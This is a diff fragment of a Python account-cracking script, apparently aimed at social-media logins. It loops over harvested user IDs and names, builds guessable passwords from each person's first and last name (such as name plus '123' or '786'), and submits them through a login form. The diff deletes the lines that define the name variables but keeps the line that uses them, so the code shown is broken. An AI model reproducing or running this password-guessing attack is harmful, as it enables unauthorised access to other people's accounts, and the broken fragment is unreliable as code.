@@ -515,13 +515,6 @@ class crack_main():
                         linex()
                         for user in self.id:
                                 iid,zee = user.split('|')
-                                first_name = zee.split(' ')[0]
-                                try:
-                                        last_name = zee.split(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 formSubmit.submit(self.rndm,iid,zee,passlist)
                 print(50*'=')
